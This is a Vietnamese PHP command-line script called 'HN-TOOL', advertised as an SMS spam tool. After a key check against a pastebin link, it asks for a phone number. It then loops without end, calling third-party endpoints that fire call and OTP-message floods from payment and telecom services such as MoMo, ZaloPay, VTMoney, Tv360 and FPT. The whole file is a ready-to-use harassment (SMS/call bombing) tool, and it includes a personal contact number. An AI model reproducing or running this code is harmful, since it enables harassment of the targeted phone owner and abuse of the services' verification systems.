<?php
error_reporting(0);
session_start();
ini_set("set_time_limit", 5);
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;32m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$do = "\033[1;31m";
$do = "\033[1;35m";
$trang = "\033[1;37m";
$_SESSION['useragent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36';
$lmkdz= $trang."</>".$do."[".$luc."HN-TOOL".$do."] ".$trang."➨ ";
$lmkdz1= $xnhac."HN-TOOL";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
	$_SESSION['load'] = 1000;
	$_SESSION['delay'] = 500;
} else {
	$_SESSION['load'] = 0;
	$_SESSION['delay'] = 0;
}
system('clear');
/////Key Tool/////
system('clear');
while (true){
$checkkey  = file('https://pastebin.com/raw/uqXw5g5T'); //// Linh Key
echo "\033[1;91m    Lưu Ý Mỗi Ngày Sẽ Đổi Một Key\n";
echo "\033[1;93mLink lấy key:\033[1;95m https://mneylink.com/Keyvippp\n"; /// Link Key Đã tạo ở link1s.com
echo "\033[1;92mNhập Key Để Vào Tool: \033[1;33m";
      $makey = trim(fgets(STDIN));
    if ($makey == $checkkey[0])  {
    sleep(1);
        echo "\033[1;35mKey Dúng Đợi Vào Tool\n";
        break;
    } else {
        echo "\033[1;91mKey Sai Vui Lòng Lấy Lại\n";
        echo "\033[1;93m-------------------------------------------------------------\n";
        sleep(1);
       continue;
       }
}
system('clear');
echo
"  
\033[1;31m
╔═════════════════════════════════════════════════════════════════╗
\033[1;31m      ██╗  ██╗███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗         
\033[1;36m      ██║  ██║████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         
\033[1;32m      ███████║██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║         
\033[1;33m      ██╔══██║██║╚██╗██║       ██║   ██║   ██║██║   ██║██║          
\033[1;31m      ██║  ██║██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗    
\033[1;37m      ╚═╝  ╚═╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    
\033[1;33m                      TOOL SPAM SMS SIÊU VIP PRO
\033[1;31m╚═════════════════════════════════════════════════════════════════╝                                                                                                                                  
\033[1;31m ╔══════════════════════════════════════╗
\033[1;31m  Zalo:\033[1;31m 0908615293              \033[1;31m
\033[1;33m  Youtube:\033[1;33m HN TOOL                \033[1;32m
\033[1;36m  Box Zalo:\033[1;36m https://zalo.me/g/diwkwg467           \033[1;33m
\033[1;35m  Update:\033[1;35m V1.0                  \033[1;34m
\033[1;34m  Copyright:\033[1;34m HN TOOL         \033[1;35m                                      
 \033[1;31m╚══════════════════════════════════════╝
\033[1;36m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
";

echo $lmkdz.$luc."Nhập Số Điện Thoại: $trang";
$sdt = trim(fgets(STDIN));
$dem = 0;
system('clear');
echo
"\033[1;31m
╔═════════════════════════════════════════════════════════════════╗
\033[1;31m      ██╗  ██╗███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗         
\033[1;36m      ██║  ██║████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         
\033[1;32m      ███████║██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║         
\033[1;33m      ██╔══██║██║╚██╗██║       ██║   ██║   ██║██║   ██║██║          
\033[1;31m      ██║  ██║██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗    
\033[1;37m      ╚═╝  ╚═╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    
\033[1;33m                      TOOL SPAM SMS SIÊU VIP PRO
\033[1;31m╚═════════════════════════════════════════════════════════════════╝                    
\033[1;31m ╔══════════════════════════════════════╗
\033[1;31m  Zalo:\033[1;31m 0908615293              \033[1;31m
\033[1;33m  Youtube:\033[1;33m HN TOOL                \033[1;32m
\033[1;36m  Box Zalo:\033[1;36m https://zalo.me/g/diwkwg467           \033[1;33m
\033[1;35m  Update:\033[1;35m V1.0                  \033[1;34m
\033[1;34m  Copyright:\033[1;34m HN TOOL         \033[1;35m                                      
 \033[1;31m╚══════════════════════════════════════╝
\033[1;36m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
";
while(true) {
	$check = json_decode(file_get_contents("https://quanghuynopro.xyz/api/call.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam Call \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check1 = json_decode(file_get_contents("https://nnquangpro.com/spammomo.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam MoMo \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check2 = json_decode(file_get_contents("https://quanghuynopro.xyz/api/tv360.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam Tv360  \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check3 = json_decode(file_get_contents("https://quanghuynopro.xyz/api/vtmoney.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;32m\033[1;32m Spam VTMoney  \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check4 = json_decode(file_get_contents("https://quanghuynopro.xyz/api/zalopay.php?phone=84837238252".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam Zalopay  \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check5 = json_decode(file_get_contents("https://quanghuynopro.xyz/api/fpt.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam FPT  \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
$check6 = json_decode(file_get_contents("https://nnquangpro.com/apivip/pop.php?phone=".$sdt));
	$dem++;
	echo " $lmkdz1 \033[1;32m[\033[1;33m".$dem."\033[1;32m] \033[1;31m\033[1;32m Spam PoP \033[1;31m\033[1;32m ".$sdt." \033[1;31m $hong$check->msg\n";
	if ($check->status == "success") {
}
	delay(1);
}
function delay ($delay){
	for($tt = $delay ;$tt>= 0;$tt--){
		echo "\r\033[1;33m   HN-TOOL \033[1;31m →_→       \033[1;32m LO      \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;31m   HN-TOOL  \033[1;33m   →_→     \033[1;37m LOA     \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;32m   HN-TOOO  \033[1;33m     →_→   \033[1;37m LOAD    \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;34m   HN-TOOL  \033[1;33m      →_→  \033[1;37m LOADI   \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;35m   HN-TOOO \033[1;33m       →_→ \033[1;37m LOADIN  \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;35m   HN-TOOL\033[1;33m       →_→ \033[1;37m LOADING \033[1;31m [ $tt ] "; usleep(1500);
        echo "\r\033[1;35m   HN-TOOL  \033[1;33m        →_→\033[1;37m LOADING.\033[1;31m [ $tt ] "; usleep(1000);} 
echo "\r\033[1;35m   SPAM SMS                      \r"; 
}
function chay($t = 23) { for ($x = 0; $x <= $t; $x++) {echo "\033[1;37m=\033[1;31m●";usleep(500); } echo"\n";}
	if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { @system('clear'); } else { @system('cls'); }
	for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep($_SESSION['load']);}
	chay(35);